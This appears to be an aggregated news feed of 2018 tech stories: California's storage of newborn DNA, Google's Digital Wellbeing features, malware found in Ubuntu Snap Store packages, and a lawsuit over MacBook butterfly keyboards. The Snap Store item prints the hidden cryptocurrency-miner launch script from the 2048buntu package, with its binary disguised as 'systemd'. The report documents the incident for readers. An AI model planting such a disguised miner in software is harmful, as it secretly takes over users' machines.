&lt;p&gt;Though, for a more permanent fix, lawmakers in Sacramento would need to pass new legislation.&lt;/p&gt;
&lt;p&gt;We've shared our findings with several state lawmakers on the &lt;a href=&quot;http://privacycp.assembly.ca.gov/membersstaff&quot;&gt;Assembly Privacy Committee&lt;/a&gt;.  Many were shocked to learn that the state was storing DNA samples from every baby born in the state and selling them to outside researchers without parents' knowledge or consent.&lt;/p&gt;
&lt;p&gt;So far, however, none have shown any interest in giving parents the right to opt out of storage before the child is born, or even requiring the state to confirm parents are informed before storing their baby's blood indefinitely.&lt;/p&gt;

<og:title>DNA of every baby born in California is stored. Who has access to it?</og:title>
<og:description>For babies born in California after 1983, DNA is likely being stored by the government, may be available to law enforcement and may even be in the hands of outside researchers</og:description>

<title>Google&amp;#039;s Plan to Make Tech Less Addictive</title>
<link>https://www.fastcodesign.com/90171307/googles-plan-to-make-tech-less-addictive</link>
<guid isPermaLink="true" >https://www.fastcodesign.com/90171307/googles-plan-to-make-tech-less-addictive</guid>
<description>&lt;div readability=&quot;11.476923076923&quot;&gt;
&lt;p&gt;We know that our smartphones are &lt;a href=&quot;https://www.fastcodesign.com/90162337/yet-another-reason-you-should-put-the-phone-down&quot;&gt;making us unhappy&lt;/a&gt;. At its annual developer’s conference this week, Google revealed that 70% of its users actually want help balancing their digital lives. What’s not so clear is what the smartphone manufacturers of the world should do about it. After all, it’s in their business interests to make their phones as engaging–or addictive–as possible.&lt;/p&gt;
&lt;/div&gt;&lt;div class=&quot;ad-wrapper ad-wrapper--mobileparallax_1&quot;&gt;
&lt;div class=&quot;ad-wrapper--ad-unit-wrap&quot;&gt;
&lt;p&gt;advertisement&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;div readability=&quot;47.540716612378&quot;&gt;
&lt;p&gt;Yet at I/O, Google introduced a clever and aggressive response to its own habit-forming products. It’s a broad initiative called &lt;a href=&quot;https://wellbeing.google/&quot;&gt;Digital Wellbeing&lt;/a&gt; that CEO Sundar Pichai says will ultimately affect every Google product. “It’s clear that technology can be a powerful force, but it’s equally clear that we can’t just be wide-eyed about [it],” said Pichai on stage at Google’s I/O conference. “We feel a deep sense of responsibility to get this right.”&lt;/p&gt;
&lt;p&gt;For now, Google’s upcoming Android P operating system is introducing three great features to help us break–or at least, better manage–our screen addictions.&lt;/p&gt;
&lt;img class=&quot;size-large wp-image-90171466 lazyload&quot; alt=&quot;&quot; width=&quot;525&quot; height=&quot;295&quot; sizes=&quot;(max-width: 525px) 100vw, 525px&quot; data-src=&quot;https://images.fastcompany.net/image/upload/w_596,c_limit,q_auto:best,f_auto,fl_lossy/wp-cms/uploads/sites/4/2018/05/i-0-googles-brilliant-plan-to-break-your-smartphone-addiction.jpg&quot;/&gt;[Photo: &lt;a href=&quot;https://michaelmroczek.com/&quot; rel=&quot;nofollow&quot;&gt;Michael Mroczek&lt;/a&gt;/&lt;a href=&quot;https://unsplash.com/photos/NHSnBQyE7RE&quot; rel=&quot;nofollow&quot;&gt;Unsplash&lt;/a&gt;]
&lt;h2&gt;Shush&lt;/h2&gt;
&lt;p&gt;With a feature called Shush, Android P will automatically silence your calls and notifications when you flip your phone over, screen side down. That means you don’t have to push any buttons or dig through deep settings menus. To put the phone down you just . . . put the phone down.&lt;/p&gt;
&lt;p&gt;What’s particularly brilliant about Shush is that its gesture is modeled directly after a behavior so many of us already do, as we place the phone face-down on the table during a meal we’d like to enjoy with friends or family. Now, that gesture will become more powerful, with software supporting your desired behavior. (Incidentally, design nerds may notice that Motorola developed this &lt;a href=&quot;https://motorola-global-portal.custhelp.com/app/answers/indevice_detail/a_id/112154/p/30,6720,9833&quot;&gt;same idea&lt;/a&gt; a few years back–but it will definitely be more widely adopted as part of Android P.)&lt;/p&gt;

&lt;h2&gt;Wind Down&lt;/h2&gt;
&lt;p&gt;“We heard from people that they checked their phone right before bed, and before they knew it, an hour or two went by,” say Sameer Samat, VP of product management at Google. Google and Apple have both already introduced warm, color shifting modes at night so that your phone’s blue light doesn’t disrupt your natural sleep cycle. But with Digital Wellbeing, Google is doing more with a feature called Wind Down mode that turns your phone gray.&lt;/p&gt;
&lt;p&gt;You set Wind Down when you’d like to go to bed, and Android P will shift into a gray-scale palette that takes some of that slot machine-style delight out of your phone. It essentially turns your device into &lt;a href=&quot;https://www.fastcodesign.com/90170255/using-the-old-mac-os-is-pure-zen&quot;&gt;a Mac from 1985&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;ad-wrapper ad-wrapper--mobilerectangle_1&quot;&gt;
&lt;div class=&quot;ad-wrapper--ad-unit-wrap&quot;&gt;
&lt;p&gt;advertisement&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;div readability=&quot;31&quot;&gt;[Image: Google]
&lt;h2&gt;Dashboard Data View&lt;/h2&gt;
&lt;p&gt;Most studies show that we check our phones more than 100 times a day. But that’s the sort of generalized stat that’s easy to brush off. Android P will have a personalized data visualization of &lt;em&gt;your&lt;/em&gt; actual phone usage, from how many times you checked it in a day, to how many push notifications you received. It will even display what you did inside various apps–and on this front, third- party developers will be able to specify trackable metrics inside their software.&lt;/p&gt;
&lt;p&gt;Exactly how specific this tracking will get is still a bit unclear–I can imagine something like “John spent six hours watching anime cartoons, and 15 minutes watching geometry proofs”–but Google wants to push what it calls “meaningful engagement,” not just garbage time on your phone. Hopefully developers feel the same way. Within this data view, you’ll also be able to set something akin to a parental control on yourself, asking apps like YouTube to notify you once you’ve watched a daily limit of videos.&lt;/p&gt;
&lt;p&gt;Of course, all these new features still seem to offer users the option to override their own self-regulatory decisions, and re-enable their own phone addiction–much like throwing out a pack of cigarettes doesn’t prevent anyone from stopping off at the gas station to grab another. Now that Digital Wellbeing has launched, hopefully these are but the first experiments Google is trying to make its phones a healthier part of our lives. We’re looking at you next, Apple.&lt;/p&gt;
&lt;/div&gt;

<title>Malware Found in the Ubuntu Snap Store</title>
<link>https://www.linuxuprising.com/2018/05/malware-found-in-ubuntu-snap-store.html</link>
<guid isPermaLink="true" >https://www.linuxuprising.com/2018/05/malware-found-in-ubuntu-snap-store.html</guid>
<description>&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-SQduQ-MZQJg/WvcucoWbrYI/AAAAAAAAAfA/Cm80FBQW8_4rlwyVnhFWU_VsOjrBeMCtwCLcBGAs/s1600/ubuntu-software-store-screenshot.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;Ubuntu Software Store&quot; border=&quot;0&quot; data-original-height=&quot;935&quot; data-original-width=&quot;1305&quot; height=&quot;458&quot; src=&quot;https://2.bp.blogspot.com/-SQduQ-MZQJg/WvcucoWbrYI/AAAAAAAAAfA/Cm80FBQW8_4rlwyVnhFWU_VsOjrBeMCtwCLcBGAs/s640/ubuntu-software-store-screenshot.png&quot; title=&quot;Ubuntu Software Store&quot; width=&quot;640&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;br/&gt;Oh, snap! Just because some packages are available to install directly from the Ubuntu Software Center doesn't make them safe. This is proved by a recent discovery of malware in some snap packages from the Ubuntu Snaps Store.&lt;p&gt;&lt;strong&gt;At least two of the snap packages, 2048buntu and Hextris, uploaded to the Ubuntu Snaps Store by user Nicolas Tomb, contained malware. All packages by Nicolas have since been &lt;a href=&quot;https://uappexplorer.com/snaps?q=author%3ANicolas+Tomb&amp;amp;sort=-points&quot; target=&quot;_blank&quot;&gt;removed&lt;/a&gt; from the Ubuntu Snaps Store, &quot;&lt;a href=&quot;https://github.com/canonical-websites/snapcraft.io/issues/651#issuecomment-388546799&quot; target=&quot;_blank&quot;&gt;pending further investigations&lt;/a&gt;&quot;.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;The report comes from a &lt;a href=&quot;https://github.com/canonical-websites/snapcraft.io/issues/651&quot; target=&quot;_blank&quot;&gt;bug&lt;/a&gt; which mentions that the 2048buntu snap package (and other packages by Nicolas Tomb) contains a hidden cryptocurrency miner inside. You can see the init script below:&lt;/p&gt;&lt;pre class=&quot;cssterm&quot;&gt;
&lt;code&gt;#!/bin/bash

currency=bcn
name=2048buntu


{ # try
/snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 1 -g
} || { # catch
cores=($(grep -c ^processor /proc/cpuinfo))

if (( $cores &amp;amp;lt; 4 )); then
    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 1
else
    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 2
fi
}&lt;/code&gt;
&lt;/pre&gt;
&lt;br/&gt;Yes, &lt;em&gt;myfirstferrari@protonmail.com&lt;/em&gt; was used in the miner script. I guess that's one way of getting a Ferrari... 🙂.&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-yrHrAqyxdKk/WvcuyGVYKAI/AAAAAAAAAfI/rTzS5qF1LeEs8vI92auKH0uhVYWgQvU-QCLcBGAs/s1600/2048buntu-game-ubuntu-snap-store.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;2048buntu ubuntu snap store&quot; border=&quot;0&quot; data-original-height=&quot;798&quot; data-original-width=&quot;1011&quot; height=&quot;504&quot; src=&quot;https://1.bp.blogspot.com/-yrHrAqyxdKk/WvcuyGVYKAI/AAAAAAAAAfI/rTzS5qF1LeEs8vI92auKH0uhVYWgQvU-QCLcBGAs/s640/2048buntu-game-ubuntu-snap-store.png&quot; title=&quot;2048buntu ubuntu snap store&quot; width=&quot;640&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;br/&gt;An interesting aspect is that Nicolas Tomb used a proprietary license for at least some of his snaps. For example, the 2048buntu snap was submitted as proprietary (the game itself was not developed by Nicolas). The game in question, &lt;a href=&quot;https://github.com/gabrielecirulli/2048&quot; target=&quot;_blank&quot;&gt;2048&lt;/a&gt;, uses a MIT license which permits distributing it as proprietary, without making the source code available, as long as the copyright notices are retained.&lt;p&gt;Side note: 2048buntu was removed from the Ubuntu Snap store but you can check out its page via &lt;a href=&quot;https://webcache.googleusercontent.com/search?source=hp&amp;amp;ei=BDT3WvTIKaGr6AT295HIDw&amp;amp;q=cache%3Ahttps%3A%2F%2Fsnapcraft.io%2F2048buntu&amp;amp;oq=cache%3Ahttps%3A%2F%2Fsnapcraft.io%2F2048buntu&amp;amp;gs_l=psy-ab.3...5653.7198.0.7376.7.7.0.0.0.0.125.686.4j3.7.0....0...1c.1.64.psy-ab..0.6.614...0j46j0i46k1.0.OioghBze15M&quot; target=&quot;_blank&quot;&gt;Google Cache&lt;/a&gt;. But we can't see the package contents any more (unless it's on GitHub somewhere but I couldn't find it).&lt;/p&gt;&lt;p&gt;&lt;em&gt;How was this possible?&lt;/em&gt; Well, the Ubuntu Snap Store allows anyone to upload snap packages, as opposed to packages (deb) available in the official Ubuntu repositories. The reason for this is to provide more easily installable packages to its users.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;What's your opinion regarding this? Do you think more and more malware will be getting through to users by allowing anyone to upload packages to the Ubuntu Store, or was this an isolated incident?&lt;/strong&gt;&lt;/p&gt;

<title>Apple faces class action lawsuit over failing MacBook butterfly keyboards</title>

<description>&lt;p&gt;Apple’s &lt;a href=&quot;https://9to5mac.com/2017/02/22/apple-butterfly-keyboard-poll/&quot;&gt;polarizing butterfly keyboard design&lt;/a&gt; is now causing the company some legal issues.

&lt;/div&gt;
&lt;p&gt;As outlined by &lt;em&gt;&lt;a href=&quot;https://appleinsider.com/articles/18/05/11/apple-hit-with-action-suit-over-macbook-macbook-pro-butterfly-keyboard-failures&quot;&gt;AppleInsider&lt;/a&gt;&lt;/em&gt;, the lawsuit was filed in the Northern District Court of California and includes both the 12-inch MacBook and the MacBook Pro.&lt;/p&gt;
&lt;p&gt;The lawsuit alleges that “thousands” of users have suffered from problems with the butterfly keyboard device that render it ultimately useless. The lawsuit says that even “minimal amounts of dust or debris” causes the keyboard to fail, thus rendering one of the “core functions” of the MacBook broken. This makes the device “inoperable and unsuitable for its ordinary and intended use.”&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Apple’s butterfly keyboard and MacBook are produced and assembled in such a way that when minimal amounts of dust or debris accumulate under or around a key, keystrokes fail to register. The keyboard defect compromises the MacBook’s core functionality.&lt;/p&gt;
&lt;p&gt;As a result of the defect, consumers who purchased a MacBook face a constant threat of non-responsive keys and accompanying keyboard failure. When one or more of the keys on the keyboard fail, the MacBook can no longer serve its core function: typing. Thus, when this defect manifests in the MacBook, the computer becomes inoperable and unsuitable for its ordinary and intended use.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The lawsuit goes on to allege Apple “knew that the MacBook is defective at or before” the release. Furthermore, it knew of the issues uses of the 12-inch MacBook were having, yet still brought the butterfly keyboard to the MacBook Pro and sold it at “premium prices.”&lt;/p&gt;
&lt;p&gt;Additionally, the suit takes issues with Apple’s marketing – which touts that the butterfly keyboard offers “four times more key stability than a traditional scissor mechanism.”&lt;/p&gt;
&lt;p&gt;The 1-year warranty Apple offers to users is acknowledged in the lawsuit, but it argues that “Apple routinely refuses to honor its warranty obligations,” instead instructing MacBook users to “try self-help remedies that it knows will not result in permanent repair.&lt;/p&gt;
&lt;p&gt;Ultimately, the lawsuit seeks damages, legal fees, and alls for Apple to disclose the keyboard flaws and replace defective units, including reimbursement for the initial laptop purchase.&lt;/p&gt;
&lt;p&gt;This certainly isn’t the first time Apple has come under fire for its butterfly keyboard mechanism. Earlier this month, a petition called for Apple to recall and replace defective MacBook keyboards – that petition has since &lt;a href=&quot;https://9to5mac.com/2018/05/03/macbook-pro-keyboard-petition/&quot;&gt;accumulated over 17,000 signatures&lt;/a&gt;.&lt;/p&gt;
